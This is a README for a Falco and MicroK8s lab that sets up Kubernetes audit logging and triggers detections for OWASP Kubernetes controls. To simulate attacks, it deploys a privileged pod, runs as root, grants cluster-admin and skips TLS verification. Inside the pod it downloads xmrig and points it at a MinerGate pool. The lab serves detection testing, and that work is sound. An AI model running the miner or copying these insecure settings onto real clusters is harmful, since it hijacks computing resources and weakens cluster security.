# Falco-MicroK8s
Setting up Falco's Kubernetes Audit plugin for MicroK8s

To enable the addon:
```
microk8s enable falco
```
The addon can be disabled at any time with:
```
microk8s disable falco
```
Accessing the FalcoSideKick user interface
```
kubectl port-forward svc/falco-falcosidekick-ui -n falco 2802 --insecure-skip-tls-verify
```
```
sudo usermod -a -G microk8s $USER
sudo chown -f -R $USER ~/.kube
```
You will also need to re-enter the session for the group update to take place:
```
su - $USER
```
Will probably set up the alias at the start of each sesson:
```
alias kubectl='microk8s kubectl'
alias helm='microk8s helm3'
```
```
kubectl apply -f https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/dodgy-pod.yaml
```
```
kubectl exec -it dodgy-pod -- bash
```
```
curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
```
```
tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
```
```
./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
```

# Enable K8s Auditing
Miscellaneous Instructions:
https://github.com/jasonumiker-sysdig/kubernetes-security-demos/blob/cc2ebd3e56a2eac0a9a20668dfb91b30af0f9e00/setup-cluster/setup-microk8s.sh#L69
```
mkdir /var/snap/microk8s/common/var/lib/k8s_audit
```
```
wget https://raw.githubusercontent.com/jasonumiker-sysdig/kubernetes-security-demos/cc2ebd3e56a2eac0a9a20668dfb91b30af0f9e00/setup-cluster/audit-policy.yaml
wget https://raw.githubusercontent.com/jasonumiker-sysdig/kubernetes-security-demos/cc2ebd3e56a2eac0a9a20668dfb91b30af0f9e00/setup-cluster/webhook-config.yaml
wget https://raw.githubusercontent.com/jasonumiker-sysdig/kubernetes-security-demos/cc2ebd3e56a2eac0a9a20668dfb91b30af0f9e00/setup-cluster/falco-values.yaml
```
```
AGENT_SERVICE_CLUSTERIP=$(kubectl get service falco-k8saudit-webhook -o=jsonpath={.spec.clusterIP} -n falco) envsubst < webhook-config.yaml.in > webhook-config.yaml
```
```
cp ./webhook-config.yaml /var/snap/microk8s/common/var/lib/k8s_audit/
cp ./audit-policy.yaml /var/snap/microk8s/common/var/lib/k8s_audit/
cat /var/snap/microk8s/current/args/kube-apiserver > kube-apiserver
```
```
cat << EOF >> kube-apiserver
--audit-log-path=/var/snap/microk8s/common/var/lib/k8s_audit/k8s_audit_events.log
--audit-policy-file=/var/snap/microk8s/common/var/lib/k8s_audit/audit-policy.yaml
--audit-log-maxbackup=1
--audit-log-maxsize=10
--audit-webhook-config-file=/var/snap/microk8s/common/var/lib/k8s_audit/webhook-config.yaml
--audit-webhook-batch-max-wait=5s
EOF
```
```
mv /var/snap/microk8s/current/args/kube-apiserver /var/snap/microk8s/current/args/kube-apiserver-orig
cp ./kube-apiserver /var/snap/microk8s/current/args/
chown root:microk8s /var/snap/microk8s/current/args/kube-apiserver
```
```
microk8s stop
```
```
microk8s start
sleep 30
```
```
kubectl rollout status daemonset falco -n falco --timeout 300s
```

# Deploying Custom Rules
```
wget https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/falco-talon/custom-rules.yaml
```

- K8sAudit DISABLED
```
helm upgrade falco falcosecurity/falco --namespace falco \
  --create-namespace \
  --set tty=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  -f custom-rules.yaml
```

- K8sAudit ENABLED
```
helm upgrade falco falcosecurity/falco -n falco -f falco-values.yaml --kube-apiserver https://127.0.0.1:16443 --set tty=true -f custom-rules.yaml
```

Remember to configure the ```IP address``` of the ```K8saudit webhook service``` in the ```webhook-config.yaml``` file:
```
sudo vi /var/snap/microk8s/common/var/lib/k8s_audit/webhook-config.yaml
```

# Monitoring OWASP Specific Control Violations

http://localhost:2802/events/?since=1h&filter=owasp

## K01 - Insecure Workload Configuration

Privileged Pod (K01.01)
```
kubectl apply -f https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/dodgy-pod.yaml
```
Read-only FS Pod (K01.02)
```
kubectl apply -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/Falco-MicroK8s/main/read-only-fs.yaml
```
Run as Root User (K01.03)
```
kubectl apply -f https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/RunAsRoot.yaml
```

![progress](https://github.com/nigeldouglas-itcarlow/Falco-MicroK8s/assets/126002808/25fd1d08-10aa-4030-a44a-a463b6b83069)

## K03 - Overly Permissive RBAC

Unnecessary use of ```cluster-admin``` (K03.01)
```
kubectl apply -f https://raw.githubusercontent.com/nigeldouglas-itcarlow/Falco-MicroK8s/main/cluster-admin.yaml
```


## Cleanup
```
wget https://raw.githubusercontent.com/nigeldouglas-itcarlow/Falco-MicroK8s/main/cleanup.sh
```
```
chmod +x cleanup.sh
```
```
./cleanup.sh
```
Forceful termination of pods in default namespace
```
kubectl delete pod <PODNAME> --grace-period=0 --force --namespace default
```
